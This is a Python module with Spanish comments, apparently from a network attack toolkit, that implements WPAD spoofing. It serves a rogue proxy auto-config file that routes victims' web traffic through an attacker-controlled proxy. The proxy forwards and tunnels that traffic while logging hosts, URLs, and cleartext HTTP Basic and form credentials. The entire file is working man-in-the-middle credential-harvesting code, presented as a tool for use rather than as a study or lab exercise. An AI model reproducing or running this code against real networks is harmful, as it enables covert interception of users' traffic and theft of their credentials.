"""WPAD: PAC falso + proxy directo que registra (y reenvia) el trafico.

Flujo: los clientes buscan "wpad" via LLMNR/NBT-NS/DHCP. Con el modulo
Poisoners activo les respondemos con nuestra IP y les servimos un wpad.dat
que los manda a nuestro proxy. El proxy reenvia HTTP tal cual, tunelea
CONNECT sin descifrar, y va loggeando hosts, URLs y credenciales que pasen
en claro. Si el proxy cae, los clientes vuelven a DIRECT solos (menos ruido).
"""
import http.server
import re
import select
import socket
import socketserver
import threading

from core.bus import bus

# Reutilizamos las regex de credenciales para escanear el trafico en claro.
from modules.creds import _BASIC_RE, _FIELD_RE

_PAC = """function FindProxyForURL(url, host) {
    if (isPlainHostName(host)) return "DIRECT";
    return "PROXY {ip}:{port}; DIRECT";
}
"""


class _PacServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    allow_reuse_address = True
    daemon_threads = True


class _ProxyServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    allow_reuse_address = True
    daemon_threads = True


class WpadSpoofer:
    """Sirve wpad.dat y corre un proxy HTTP que deja log de todo lo que pasa."""

    def __init__(self, our_ip: str, pac_port: int = 80, proxy_port: int = 3128):
        self.our_ip = our_ip
        self.pac_port = pac_port
        self.proxy_port = proxy_port
        self._pac: _PacServer | None = None
        self._proxy: _ProxyServer | None = None
        self._running = False
        self.hits = 0
        self.creds: list[dict] = []  # buffer en memoria, nunca a disco
        self._clients: set[socket.socket] = set()
        self._clients_lock = threading.Lock()

    # ------------------------------------------------------------------ PAC
    def _make_pac_handler(self):
        ip, port = self.our_ip, self.proxy_port

        class Handler(http.server.BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def do_GET(self):
                if self.path.split("?")[0] in ("/wpad.dat", "/proxy.pac", "/wpad.da"):
                    body = _PAC.format(ip=ip, port=port).encode()
                    self.send_response(200)
                    self.send_header("Content-Type", "application/x-ns-proxy-autoconfig")
                    self.send_header("Content-Length", str(len(body)))
                    self.end_headers()
                    self.wfile.write(body)
                    bus.emit({"type": "wpad", "msg": f"wpad.dat servido a {self.client_address[0]}"})
                    return
                self.send_response(404)
                self.send_header("Content-Length", "0")
                self.end_headers()

            do_POST = do_GET

        return Handler

    # ------------------------------------------------------------------ proxy
    def _scan_creds(self, data: bytes, src: str) -> None:
        text = data.decode(errors="ignore")
        m = _BASIC_RE.search(text)
        if m:
            import base64
            try:
                decoded = base64.b64decode(m.group(1)).decode(errors="ignore")
                self._cred("HTTP-Basic (proxy)", decoded, src)
            except Exception:
                pass
        for k, v in _FIELD_RE.findall(text):
            self._cred("HTTP-Form (proxy)", f"{k}={v}", src)

    def _cred(self, proto: str, data: str, src: str) -> None:
        import time
        entry = {"ts": time.strftime("%H:%M:%S"), "proto": proto, "data": data, "src": src}
        self.creds.append(entry)
        if len(self.creds) > 500:
            self.creds.pop(0)
        bus.emit({"type": "cred", "proto": proto, "data": data, "src": src, "dst": "proxy"})

    def _handle_proxy(self, request: socket.socket, client_addr) -> None:
        src = client_addr[0]
        request.settimeout(30)
        with self._clients_lock:
            self._clients.add(request)
        try:
            data = b""
            while b"\r\n\r\n" not in data:
                chunk = request.recv(4096)
                if not chunk:
                    return
                data += chunk
                if len(data) > 65536:
                    return  # cabeceras desmesuradas: cortamos
            head, _, rest = data.partition(b"\r\n\r\n")
            # Content-Length del cuerpo
            m = re.search(rb"(?i)content-length:\s*(\d+)", head)
            if m:
                remaining = min(int(m.group(1)), 65536) - len(rest)
                while remaining > 0:
                    chunk = request.recv(min(65536, remaining))
                    if not chunk:
                        break
                    rest += chunk
                    remaining -= len(chunk)
            self._scan_creds(head + rest, src)

            first = head.split(b"\r\n", 1)[0].decode(errors="ignore")
            if first.upper().startswith("CONNECT"):
                host = first.split(" ")[1] if " " in first else "?"
                bus.emit({"type": "wpad", "msg": f"Tunel CONNECT {host} desde {src}"})
                self.hits += 1
                self._tunnel(request, host)
                return

            hm = re.search(rb"(?i)host:\s*([^\r\n]+)", head)
            host = hm.group(1).decode(errors="ignore").strip() if hm else "?"
            path = first.split(" ")[1] if " " in first else "/"
            bus.emit({"type": "wpad", "msg": f"{first.split(' ')[0] if ' ' in first else '?'} "
                                              f"http://{host}{path[:80]} desde {src}"})
            self.hits += 1
            self._forward(request, host, head + b"\r\n\r\n" + rest)
        except Exception:
            pass
        finally:
            with self._clients_lock:
                self._clients.discard(request)
            try:
                request.close()
            except Exception:
                pass

    def _resolve_target(self, head: bytes) -> tuple[str, int]:
        # Proxy estandar: "GET http://host:port/path" (URI absoluta)
        first = head.split(b"\r\n", 1)[0].decode(errors="ignore")
        parts = first.split(" ")
        if len(parts) >= 2 and "://" in parts[1]:
            from urllib.parse import urlsplit
            u = urlsplit(parts[1])
            return u.hostname or "127.0.0.1", u.port or 80
        hm = re.search(rb"(?i)host:\s*([^\r\n]+)", head)
        if hm:
            host = hm.group(1).decode(errors="ignore").strip()
            if ":" in host:
                h, p = host.rsplit(":", 1)
                if p.isdigit():
                    return h, int(p)
            return host, 80
        return "127.0.0.1", 80

    def _forward(self, client: socket.socket, _host: str, raw: bytes) -> None:
        host, port = self._resolve_target(raw)
        try:
            up = socket.create_connection((host, port), timeout=10)
        except Exception:
            client.sendall(b"HTTP/1.1 502 Bad Gateway\r\nContent-Length: 0\r\n\r\n")
            return
        try:
            up.sendall(raw)
            self._pipe(client, up)
        except Exception:
            pass
        finally:
            for s in (client, up):
                try:
                    s.close()
                except Exception:
                    pass

    def _tunnel(self, client: socket.socket, hostport: str) -> None:
        try:
            host, port = hostport.rsplit(":", 1)
            port = int(port)
        except Exception:
            client.sendall(b"HTTP/1.1 400 Bad Request\r\n\r\n")
            return
        try:
            up = socket.create_connection((host, port), timeout=10)
        except Exception:
            client.sendall(b"HTTP/1.1 502 Bad Gateway\r\nContent-Length: 0\r\n\r\n")
            return
        client.sendall(b"HTTP/1.1 200 Connection Established\r\n\r\n")
        try:
            self._pipe(client, up)
        except Exception:
            pass
        finally:
            for s in (client, up):
                try:
                    s.close()
                except Exception:
                    pass

    def _pipe(self, a: socket.socket, b: socket.socket) -> None:
        sockets = [a, b]
        while self._running:
            readable, _, err = select.select(sockets, [], sockets, 60)
            if err or not readable:
                return
            for s in readable:
                try:
                    data = s.recv(65536)
                except Exception:
                    return
                if not data:
                    return
                (b if s is a else a).sendall(data)

    # ------------------------------------------------------------------ ciclo de vida
    def start(self) -> None:
        self._running = True
        self._pac = _PacServer(("0.0.0.0", self.pac_port), self._make_pac_handler())

        spoofer = self

        class ProxyHandler(socketserver.BaseRequestHandler):
            def handle(self):
                spoofer._handle_proxy(self.request, self.client_address)

        self._proxy = _ProxyServer(("0.0.0.0", self.proxy_port), ProxyHandler)
        threading.Thread(target=self._pac.serve_forever, daemon=True).start()
        threading.Thread(target=self._proxy.serve_forever, daemon=True).start()
        bus.emit({"type": "wpad", "msg": f"WPAD activo: PAC en :{self.pac_port}, "
                                         f"proxy en :{self.proxy_port} ({self.our_ip})"})

    def stop(self) -> None:
        self._running = False
        # Matar los tuneles activos: sin esto los sockets aceptados siguen
        # vivos hasta que caduquen solos.
        with self._clients_lock:
            clients = list(self._clients)
            self._clients.clear()
        for s in clients:
            try:
                s.shutdown(socket.SHUT_RDWR)
            except Exception:
                pass
            try:
                s.close()
            except Exception:
                pass
        for srv in (self._pac, self._proxy):
            if srv:
                try:
                    srv.shutdown()
                    srv.server_close()
                except Exception:
                    pass
        self._pac = None
        self._proxy = None
        bus.emit({"type": "wpad", "msg": f"WPAD detenido ({self.hits} peticiones registradas)"})
